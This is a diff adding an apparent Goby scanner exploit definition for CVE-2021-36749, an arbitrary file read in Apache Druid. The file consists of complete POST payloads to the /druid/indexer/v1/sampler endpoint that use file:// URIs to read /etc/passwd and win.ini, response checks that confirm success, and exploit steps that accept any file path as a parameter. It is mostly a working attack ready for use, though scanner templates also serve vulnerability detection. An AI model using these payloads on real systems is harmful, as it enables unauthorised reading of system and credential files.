@@ -1,0 +1,186 @@
+{
+      "Name": "apache-druid-cve-2021-36749-linux",
+      "Level": "3",
+      "Tags": [
+            "fileread"
+      ],
+      "GobyQuery": "title=\"Apache Druid\"",
+      "Description": "",
+      "Product": "",
+      "Homepage": "https://gobies.org/",
+      "Author": "gobysec@gmail.com",
+      "Impact": "",
+      "Recommendation": "",
+      "References": [
+            "https://gobies.org/"
+      ],
+      "HasExp": true,
+      "ExpParams": [
+            {
+                  "Name": "linux_file",
+                  "Type": "input",
+                  "Value": "/etc/passwd"
+            },
+            {
+                  "Name": "windows_file",
+                  "Type": "input",
+                  "Value": "c://windows/win.ini"
+            }
+      ],
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "OR",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/druid/indexer/v1/sampler?for=connect",
+                        "follow_redirect": true,
+                        "header": {
+                              "Content-Type": "application/json"
+                        },
+                        "data_type": "text",
+                        "data": "{\"type\": \"index\", \"spec\": {\"type\": \"index\", \"ioConfig\": {\"type\": \"index\", \"firehose\": {\"type\": \"http\", \"uris\": [\"file:///etc/passwd\"]}}, \"dataSchema\": {\"dataSource\": \"sample\", \"parser\": {\"type\": \"string\", \"parseSpec\": {\"format\": \"regex\", \"pattern\": \"(.*)\", \"columns\": [\"a\"], \"dimensionsSpec\": {}, \"timestampSpec\": {\"column\": \"!!!_no_such_column_!!!\", \"missingValue\": \"2010-01-01T00:00:00Z\"}}}}}, \"samplerConfig\": {\"numRows\": 500, \"timeoutMs\": 15000}}",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "root:x",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "bin/bash",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|text|"
+                  ]
+            },
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/druid/indexer/v1/sampler?for=connect",
+                        "follow_redirect": true,
+                        "header": {
+                              "Content-Type": "application/json"
+                        },
+                        "data_type": "text",
+                        "data": "{\"type\": \"index\", \"spec\": {\"type\": \"index\", \"ioConfig\": {\"type\": \"index\", \"firehose\": {\"type\": \"http\", \"uris\": [\"file:///c://windows/win.ini\"]}}, \"dataSchema\": {\"dataSource\": \"sample\", \"parser\": {\"type\": \"string\", \"parseSpec\": {\"format\": \"regex\", \"pattern\": \"(.*)\", \"columns\": [\"a\"], \"dimensionsSpec\": {}, \"timestampSpec\": {\"column\": \"!!!_no_such_column_!!!\", \"missingValue\": \"2010-01-01T00:00:00Z\"}}}}}, \"samplerConfig\": {\"numRows\": 500, \"timeoutMs\": 15000}}",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "for 16-bit app support",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "fonts",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            }
+      ],
+      "ExploitSteps": [
+            "OR",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/druid/indexer/v1/sampler?for=connect",
+                        "follow_redirect": true,
+                        "header": {
+                              "Content-Type": "application/json"
+                        },
+                        "data_type": "text",
+                        "data": "{\"type\": \"index\", \"spec\": {\"type\": \"index\", \"ioConfig\": {\"type\": \"index\", \"firehose\": {\"type\": \"http\", \"uris\": [\"file:///{{{linux_file}}}\"]}}, \"dataSchema\": {\"dataSource\": \"sample\", \"parser\": {\"type\": \"string\", \"parseSpec\": {\"format\": \"regex\", \"pattern\": \"(.*)\", \"columns\": [\"a\"], \"dimensionsSpec\": {}, \"timestampSpec\": {\"column\": \"!!!_no_such_column_!!!\", \"missingValue\": \"2010-01-01T00:00:00Z\"}}}}}, \"samplerConfig\": {\"numRows\": 500, \"timeoutMs\": 15000}}",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody||"
+                  ]
+            },
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/druid/indexer/v1/sampler?for=connect",
+                        "follow_redirect": true,
+                        "header": {
+                              "Content-Type": "application/json"
+                        },
+                        "data_type": "text",
+                        "data": "{\"type\": \"index\", \"spec\": {\"type\": \"index\", \"ioConfig\": {\"type\": \"index\", \"firehose\": {\"type\": \"http\", \"uris\": [\"file:///{{{windows_file}}}\"]}}, \"dataSchema\": {\"dataSource\": \"sample\", \"parser\": {\"type\": \"string\", \"parseSpec\": {\"format\": \"regex\", \"pattern\": \"(.*)\", \"columns\": [\"a\"], \"dimensionsSpec\": {}, \"timestampSpec\": {\"column\": \"!!!_no_such_column_!!!\", \"missingValue\": \"2010-01-01T00:00:00Z\"}}}}}, \"samplerConfig\": {\"numRows\": 500, \"timeoutMs\": 15000}}",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody||"
+                  ]
+            }
+      ],
+      "PostTime": "2021-11-05 12:05:27",
+      "GobyVersion": "1.9.304"
+}
